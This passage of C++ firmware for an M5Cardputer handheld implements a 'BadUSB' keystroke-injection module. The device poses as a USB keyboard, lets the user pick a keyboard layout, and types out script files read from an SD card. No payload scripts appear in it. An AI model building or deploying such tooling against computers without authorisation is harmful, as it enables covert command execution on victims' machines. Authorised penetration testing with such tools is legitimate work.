          if (strcmp(Cmd, "BREAK") == 0)        { Kb.press(KEY_PAUSE);      Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "CAPSLOCK") == 0)     { Kb.press(KEY_CAPS_LOCK);  Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PAUSE") == 0)        { Kb.press(KEY_PAUSE);      Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "BACKSPACE") == 0)    { Kb.press(KEY_BACKSPACE);   Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "END") == 0)          { Kb.press(KEY_END);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "HOME") == 0)         { Kb.press(KEY_HOME);       Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "INSERT") == 0)       { Kb.press(KEY_INSERT);     Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "NUMLOCK") == 0)      { Kb.press(LED_NUMLOCK);    Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PAGEUP") == 0)       { Kb.press(KEY_PAGE_UP);    Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PAGEDOWN") == 0)     { Kb.press(KEY_PAGE_DOWN);  Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PRINTSCREEN") == 0)  { Kb.press(KEY_PRINT_SCREEN);Kb.releaseAll();}else { cmdFail++;}
          if (strcmp(Cmd, "SCROLLOCK") == 0)    { Kb.press(KEY_SCROLL_LOCK);Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "MENU") == 0)         { Kb.press(KEY_MENU);       Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F1") == 0)           { Kb.press(KEY_F1);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F2") == 0)           { Kb.press(KEY_F2);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F3") == 0)           { Kb.press(KEY_F3);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F4") == 0)           { Kb.press(KEY_F4);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F5") == 0)           { Kb.press(KEY_F5);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F6") == 0)           { Kb.press(KEY_F6);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F7") == 0)           { Kb.press(KEY_F7);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F8") == 0)           { Kb.press(KEY_F8);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F9") == 0)           { Kb.press(KEY_F9);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F10") == 0)          { Kb.press(KEY_F10);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F11") == 0)          { Kb.press(KEY_F11);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F12") == 0)          { Kb.press(KEY_F12);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "TAB") == 0)          { Kb.press(KEY_TAB);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "DELETE") == 0)       { Kb.press(KEY_DELETE);     Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "SPACE") ==0)         { Kb.press(KEY_SPACE);      Kb.releaseAll();} else { cmdFail++;}

          if (ArgIsCmd) strcpy(Cmd, OldCmd);  // Recover the command to run in case of REPEAT

          Kb.releaseAll();

          if (line == 7) {
            M5.Display.setCursor(0, 0);
            M5.Display.fillScreen(TFT_BLACK);
            line = 0;
          }
          line++;

          if (cmdFail == 57) {
            M5.Display.setTextColor(TFT_RED);
            M5.Display.print(Command);
            M5.Display.println(" -> Not Supported, running as STRINGLN");
            if (Command != Argument) {
              Kb.print(Command);
              Kb.print(" ");
              Kb.println(Argument);
            } else {
              Kb.println(Command);
            }
          } else {
            M5.Display.setTextColor(TFT_BLACK);
            M5.Display.println(Command);
          }
          M5.Display.setTextColor(TFT_WHITE);
          M5.Display.println(Argument);

          if (strcmp(Cmd, "REM") != 0) delay(DEF_DELAY);  //if command is not a comment, wait DEF_DELAY until next command (100ms)
        }
      }
      M5.Display.setTextSize(1.5);
      payloadFile.close();
      Serial.println("Finished badusb payload execution...");
    }
  } 
  delay(1000);
  Kb.releaseAll();
}


void chooseKb(const uint8_t *layout) {
    kbChosen = true;
    Kb.begin(layout);  // Initialise le clavier avec la disposition choisie
    USB.begin();       // S'assure que l'USB est initialisé après le choix du clavier
}


void showKeyboardLayoutOptions() {
    std::vector<std::pair<String, std::function<void()>>> keyboardOptions = {
        {"US Inter",    [=]() { chooseKb(KeyboardLayout_en_US); }},
        {"PT-BR ABNT2", [=]() { chooseKb(KeyboardLayout_pt_BR); }},
        {"PT-Portugal", [=]() { chooseKb(KeyboardLayout_pt_PT); }},
        {"AZERTY FR",   [=]() { chooseKb(KeyboardLayout_fr_FR); }},
        {"es-Espanol",  [=]() { chooseKb(KeyboardLayout_es_ES); }},
        {"it-Italiano", [=]() { chooseKb(KeyboardLayout_it_IT); }},
        {"en-UK",       [=]() { chooseKb(KeyboardLayout_en_UK); }},
        {"de-DE",       [=]() { chooseKb(KeyboardLayout_de_DE); }},
        {"sv-SE",       [=]() { chooseKb(KeyboardLayout_sv_SE); }},
        {"da-DK",       [=]() { chooseKb(KeyboardLayout_da_DK); }},
        {"hu-HU",       [=]() { chooseKb(KeyboardLayout_hu_HU); }},
    };
    loopOptions(keyboardOptions, false, true, "Keyboard Layout");

    if (!kbChosen) {
        Kb.begin(KeyboardLayout_fr_FR); // Commencer avec la disposition par défaut si rien n'est choisi
    }
}
void showScriptOptions() {
    File root = SD.open("/BadUsbScript");
    std::vector<std::pair<String, std::function<void()>>> scriptOptions;

    while (true) {
        File entry = root.openNextFile();
        if (!entry) break;
        if (!entry.isDirectory()) {
            String filename = entry.name();
            scriptOptions.push_back({filename, [=]() { runScript(filename); }});
        }
        entry.close();
    }

    if (scriptOptions.empty()) {
        // Affichez un message à l'utilisateur ou exécutez une action par défaut
        Serial.println("Aucun script disponible.");
        M5.Display.println("Aucun script disponible.");
        // Vous pouvez aussi exécuter une fonction par défaut ici, si nécessaire
    } else {
        loopOptions(scriptOptions, false, true, "Choose Script");
    }

    // Quand un script est choisi, exécuter sa fonction
}


void runScript(const String &scriptName) {
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.println("Preparing");
    delay(200);

    String bad_script = "/BadUsbScript/" + scriptName;
    FS &fs = SD;
    if (!kbChosen) {
        chooseKb(KeyboardLayout_fr_FR);// Commencer avec la disposition par défaut si rien n'est choisi
    }
    key_input(fs, bad_script);

    M5.Display.println("Payload Sent");
    delay(1000);
}

void badUSB() {
    Serial.println("BadUSB begin");
    M5.Display.fillScreen(TFT_BLACK);
    std::vector<std::pair<String, std::function<void()>>> mainOptions = {
        {"Script on SD", []() { showScriptOptions(); }},
        {"Keyboard Layout", []() { showKeyboardLayoutOptions(); showScriptOptions();}}
    };

    loopOptions(mainOptions, false, true, "Main Menu");

    // Attendre que l'utilisateur appuie sur "Entrée" ou "Retour arrière"
    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        // Boucle jusqu'à ce qu'une touche soit pressée
    }
    
    Serial.begin(115200);
    waitAndReturnToMenu("Return to menu");
}

// badusb end
